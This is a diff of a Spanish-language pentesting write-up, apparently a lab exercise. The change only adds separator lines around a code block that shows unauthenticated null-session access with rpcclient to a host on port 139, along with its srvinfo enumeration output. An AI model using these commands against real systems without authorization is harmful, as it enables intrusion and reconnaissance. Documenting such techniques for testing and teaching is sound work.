@@ -11,6 +11,7 @@ El SID del dominio NAME_DOMAIN.LOCAL es: S-1-5-21-1038751438-1834703946-36937684
 ---
 Si en la fase enumeración se encontrado expuesto el servicio `rpc-->139`, existe la posibilidad e explotar la vulnerabilidad de nullsession, por lo que esto se puede ejecutar una validación con la herramienta `rpcclient`.
 ```ruby
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ┌──(s3cur1ty3c㉿kali)-[~]
 └─$ rpcclient -N -U "" 192.168.200.149
 rpcclient $> srvinfo
@@ -18,7 +19,8 @@ rpcclient $> srvinfo
         platform_id     :       500
         os version      :       6.1
         server type     :       0x809a03
-rpcclient $> 
+rpcclient $>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 Como se puede apreciar en la ejecución anterior, una vez accedido al equipo victima mediante rpcclient, aprovechando nullsession, se puede usar el comando `srvinfo`, para extraer información del equipo accedido.
 #### Detalles
